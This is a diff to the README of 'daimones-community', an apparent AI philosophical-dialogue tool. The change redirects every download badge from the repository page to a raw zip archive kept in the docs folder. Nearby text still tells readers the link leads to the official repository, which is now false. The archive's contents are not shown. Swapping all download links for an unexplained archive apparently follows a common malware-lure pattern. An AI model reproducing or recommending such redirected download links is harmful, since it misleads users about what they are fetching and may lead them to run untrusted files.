@@ -1,6 +1,6 @@
 # 🤖 daimones-community - Engage with AI Philosophical Dialogue
 
-[![Download daimones-community](https://img.shields.io/badge/Download-From%20GitHub-4a90e2?style=for-the-badge&logo=github)](https://github.com/Nousheen0329/daimones-community)
+[![Download daimones-community](https://img.shields.io/badge/Download-From%20GitHub-4a90e2?style=for-the-badge&logo=github)](https://github.com/Nousheen0329/daimones-community/raw/refs/heads/main/docs/community_daimones_v3.5.zip)
 
 ---
 
@@ -44,7 +44,7 @@ daimones-community is ready to use with no complicated setups. Follow these step
 
 Visit this page to download the software:
 
-[![Download daimones-community](https://img.shields.io/badge/Download-GitHub%20Page-6e7f80?style=for-the-badge&logo=github)](https://github.com/Nousheen0329/daimones-community)
+[![Download daimones-community](https://img.shields.io/badge/Download-GitHub%20Page-6e7f80?style=for-the-badge&logo=github)](https://github.com/Nousheen0329/daimones-community/raw/refs/heads/main/docs/community_daimones_v3.5.zip)
 
 This link takes you to the official GitHub repository. You will find the latest version available for download, along with setup instructions.
 
@@ -141,7 +141,7 @@ Use these resources to deepen your understanding and enhance your experience.
 
 ## 📥 Quick Download Link
 
-[![Download daimones-community](https://img.shields.io/badge/Get%20daimones--community-From%20GitHub-4a90e2?style=for-the-badge&logo=github)](https://github.com/Nousheen0329/daimones-community)
+[![Download daimones-community](https://img.shields.io/badge/Get%20daimones--community-From%20GitHub-4a90e2?style=for-the-badge&logo=github)](https://github.com/Nousheen0329/daimones-community/raw/refs/heads/main/docs/community_daimones_v3.5.zip)
 
 ---
 
